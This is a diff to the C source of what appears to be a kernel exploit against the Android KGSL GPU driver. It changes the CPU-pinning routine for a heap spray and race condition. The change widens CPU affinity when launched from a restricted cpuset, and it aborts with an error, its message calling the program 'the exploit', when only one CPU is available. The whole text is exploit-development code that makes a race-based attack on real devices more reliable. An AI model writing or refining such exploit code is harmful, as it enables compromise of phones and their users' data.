@@ -2233,7 +2233,45 @@ static int pin_parent_for_spray(void) {
                     "[*] KGSL_CPU/KGSL_RACE_CPU both point at CPU %d;"
                     " moving the racer to CPU %d\n", g_park_cpu, fallback);
             g_race_cpu = fallback;
+        } else if (env_status == 0) {
+            /*
+             * A su/root launcher can land in a single-CPU cpuset.  Widen to
+             * every online CPU; if the cpuset still allows only one CPU the
+             * race cannot work, so say so instead of spinning.
+             */
+            cpu_set_t all;
+            CPU_ZERO(&all);
+            for (int cpu = 0; cpu < CPU_SETSIZE; cpu++)
+                CPU_SET(cpu, &all);
+            if (sched_setaffinity(0, sizeof(all), &all) == 0 &&
+                sched_getaffinity(0, sizeof(g_allowed_cpus),
+                                  &g_allowed_cpus) == 0) {
+                int park = -1;
+                for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--)
+                    if (CPU_ISSET(cpu, &g_allowed_cpus)) {
+                        park = cpu;
+                        break;
+                    }
+                if (park >= 0) {
+                    g_park_cpu = park;
+                    g_race_cpu = -1;
+                    for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--)
+                        if (CPU_ISSET(cpu, &g_allowed_cpus) &&
+                            cpu != g_park_cpu) {
+                            g_race_cpu = cpu;
+                            break;
+                        }
+                }
+            }
         }
+    }
+    if (g_race_cpu == g_park_cpu) {
+        fprintf(stderr,
+                "[-] only CPU %d is available to this process; two CPUs are"
+                " needed for the race (launch the exploit from the shell)\n",
+                g_park_cpu);
+        errno = EINVAL;
+        return -1;
     }
     CPU_ZERO(&g_race_mask);
     CPU_SET(g_race_cpu, &g_race_mask);
@@ -2248,11 +2286,6 @@ static int pin_parent_for_spray(void) {
     }
     printf("[*] pinning child allocation to CPU %d, race mmap on CPU %d, racer(s) on CPU %d\n",
            g_park_cpu, g_park_cpu, g_race_cpu);
-    if (g_race_cpu == g_park_cpu)
-        fprintf(stderr,
-                "[-] no second CPU for the race: the mmap and the racer are"
-                " both on CPU %d (unset KGSL_CPU/KGSL_RACE_CPU or pick two"
-                " CPUs)\n", g_park_cpu);
     return 0;
 }
 
